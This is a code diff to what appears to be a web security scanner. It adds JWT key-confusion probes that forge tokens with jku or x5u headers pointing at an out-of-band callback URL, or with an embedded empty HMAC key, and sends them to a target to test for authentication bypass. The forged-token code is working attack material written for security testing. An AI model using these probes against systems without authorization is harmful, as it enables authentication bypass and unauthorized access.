@@ -290,6 +290,112 @@ def _forge_claim_mutation(
     return _build_token(header, mutated, signature), title, technique
 
 
+def _forge_key_confusion(header: Dict, payload: Dict, oast_url: str, kind: str = "jku") -> Tuple[str, str, str]:
+    """Forge a token whose header points key resolution at attacker-controlled material.
+
+    ``kind`` is 'jku' (JWKS URL), 'x5u' (X.509 URL), or 'jwk' (inline embedded key).
+    For jku/x5u the URL is an OAST allocation; a callback proves the server
+    fetches attacker-controlled key material. The token itself is signed with
+    an empty HMAC secret — servers that trust the header to source keys often
+    resolve to empty/attacker bytes and accept the token.
+    """
+    confused = dict(header)
+    confused["alg"] = "HS256"  # force symmetric after key sourcing
+    if kind == "jku":
+        confused["jku"] = oast_url.rstrip("/") + "/.well-known/jwks.json"
+    elif kind == "x5u":
+        confused["x5u"] = oast_url.rstrip("/") + "/attacker-cert.pem"
+    elif kind == "jwk":
+        confused["jwk"] = {"kty": "oct", "k": _b64url_encode(b"")}
+    forged = _sign_hs(confused, payload, b"", "HS256")
+    titles = {
+        "jku": "JWT jku header: server fetched attacker JWKS",
+        "x5u": "JWT x5u header: server fetched attacker certificate",
+        "jwk": "JWT embedded jwk accepted (self-signed token)",
+    }
+    techniques = {
+        "jku": "jku key-source injection",
+        "x5u": "x5u key-source injection",
+        "jwk": "embedded jwk trust",
+    }
+    return forged, titles[kind], techniques[kind]
+
+
+def run_jwt_key_confusion(
+    *,
+    auth_header: Optional[str],
+    target_url: str,
+    target_method: str,
+    target_endpoint_path: str,
+    session: requests.Session,
+    timeout: float,
+    oast=None,
+) -> List[Finding]:
+    """Probe jku/x5u/jwk header trust with OAST correlation.
+
+    Requires an available OAST provider; returns [] otherwise. Most relevant
+    for asymmetric algorithms (RS/ES/PS) where the server must fetch key
+    material — but HS servers with header-trust bugs are also probed.
+    """
+    findings: List[Finding] = []
+    parsed = parse_bearer_jwt(auth_header)
+    if parsed is None or oast is None or not getattr(oast, "available", False):
+        return findings
+    header, payload, signature, _raw = parsed
+    alg = str(header.get("alg", "")).upper()
+    if not (alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS")):
+        # Key sourcing matters for asymmetric verification; HS tokens with
+        # jku are unusual enough that probing adds noise.
+        return findings
+
+    for kind in ("jku", "x5u", "jwk"):
+        try:
+            allocation = oast.allocate(check_id=f"jwt_{kind}")
+        except Exception:
+            continue
+        token, title, technique = _forge_key_confusion(
+            header, payload, allocation.http_url, kind,
+        )
+        obs = _send_token(session, target_method, target_url, token, timeout)
+        if obs is None or obs.error:
+            continue
+
+        # Correlate: OAST callback proves key fetching; a 2xx with the forged
+        # token proves the forged key was trusted. Either alone is strong.
+        if kind == "jwk":
+            vulnerable = 200 <= obs.status_code < 300
+            evidence = "Server accepted a token whose header embedded its own signing key."
+        else:
+            import time as _time
+            _time.sleep(0.1)
+            interactions = oast.poll(allocation)
+            vulnerable = bool(interactions)
+            evidence = (
+                f"OAST token {allocation.token} received {len(interactions)} "
+                f"interaction(s) after supplying {kind} pointing at attacker infrastructure."
+            )
+        if vulnerable:
+            findings.append(
+                _mk(
+                    "critical",
+                    title,
+                    endpoint=target_endpoint_path,
+                    method=target_method,
+                    request_url=target_url,
+                    evidence=evidence,
+                    payload=token,
+                    technique=technique,
+                    status_code=obs.status_code,
+                    request_headers={"Authorization": f"Bearer {token}"},
+                    response_body=obs.body,
+                    response_headers=obs.headers,
+                    confidence="confirmed",
+                    comparison_summary="",
+                )
+            )
+    return findings
+
+
 # ---------------------------------------------------------------------------
 # Probes
 # ---------------------------------------------------------------------------
@@ -355,10 +461,13 @@ def run_jwt_attacks(
     # 2. Weak HMAC secret (only if original header.alg is an HS variant)
     if alg.startswith("HS"):
         for secret in WEAK_HMAC_SECRETS:
+            before = len(findings)
             token, title, technique = _forge_weak_hmac(header, payload, secret, alg)
             _try(token, title, "critical",
                   f"Server accepted a token signed with HMAC secret {secret!r}",
                   technique)
+            if len(findings) > before:
+                break  # one accepted secret is enough evidence
 
     # 3. Expired token replay
     token, title, technique = _forge_expired(header, payload, signature)
@@ -444,7 +553,5 @@ def run_jwt_attacks(
               "duplicate claim key")
     except Exception:
         pass  # pragma: no cover
-
-    return findings
 
     return findings
